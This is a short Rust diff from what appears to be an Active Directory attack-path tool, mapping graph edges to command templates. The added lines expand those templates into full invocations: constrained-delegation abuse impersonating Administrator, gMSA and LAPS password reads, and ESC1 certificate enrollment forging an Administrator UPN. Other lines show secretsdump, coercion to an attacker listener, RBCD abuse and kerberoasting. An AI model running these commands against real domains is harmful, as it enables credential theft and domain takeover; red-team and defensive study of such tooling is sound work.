@@ -120,7 +120,9 @@ impl EdgeKind {
         use ControlPrimitive as P;
         Some(match self {
             EdgeKind::MemberOf | EdgeKind::SidHistory => return None,
-            EdgeKind::AllowedToDelegate => "attack constrained --target {to}",
+            EdgeKind::AllowedToDelegate => {
+                "attack constrained --kdc <KDC> --realm <REALM> --account {from} --account-password <PASSWORD> --impersonate Administrator --target-spn <SPN-ON-{to}>"
+            }
             EdgeKind::UnconstrainedDelegation => return None, // planned: attack unconstrained
             EdgeKind::HasSession => "attack secretsdump --host {from}",
             EdgeKind::Coercible => "attack coerce --host {to} --listener <ATTACKER>",
@@ -135,9 +137,15 @@ impl EdgeKind {
                     "attack abuse --write-rbcd --target {to} && attack rbcd --target {to}"
                 }
                 P::WriteSpn => "attack abuse --add-spn --target {to} && attack roast",
-                P::ReadGmsaPassword => "attack gmsa --account {to}",
-                P::ReadLapsPassword => "attack laps --computer {to}",
-                P::Enroll => "attack esc1 --template {to}",
+                P::ReadGmsaPassword => {
+                    "attack gmsa --url <LDAPS-URL> --user <USER> --password <PASSWORD> --target {to}"
+                }
+                P::ReadLapsPassword => {
+                    "attack laps --url <LDAPS-URL> --user <USER> --password <PASSWORD> --target {to}"
+                }
+                P::Enroll => {
+                    "attack esc1 --host <CA-HOST> --domain <NETBIOS> --user <USER> --password <PASSWORD> --ca <CA-NAME> --template {to} --upn Administrator@<REALM>"
+                }
                 // Found by `enum`, not yet executable: shadow credentials outside the relay
                 // path, BadSuccessor, template rewrite, the rest.
                 _ => return None,
